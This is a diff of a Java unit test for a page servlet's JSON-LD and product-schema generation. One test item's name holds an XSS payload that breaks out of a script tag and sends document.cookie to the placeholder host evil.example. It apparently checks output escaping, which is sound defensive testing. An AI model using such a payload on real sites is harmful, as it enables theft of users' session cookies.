@@ -91,7 +91,6 @@ class PageServletTest {
     Map<String, String> sitePropertyMap = new HashMap<>();
     sitePropertyMap.put("site.name", "Example Co");
 
-    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, null, null);
     Item item = new Item();
     item.setName("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
     item.setDescription("Also \"quoted\" and <b>bold</b>");
@@ -176,6 +175,9 @@ class PageServletTest {
     Map<String, Object> product = PageServlet.computeProductSchema(pageRenderInfo, "https://example.org");
 
     assertNull(product.get("offers"));
+  }
+
+  @Test
   void generateJsonLdDataIncludesSameAsForEachSocialMediaLink() {
     PageRenderInfo pageRenderInfo = new PageRenderInfo();
     pageRenderInfo.setPageUrl("https://example.org/");
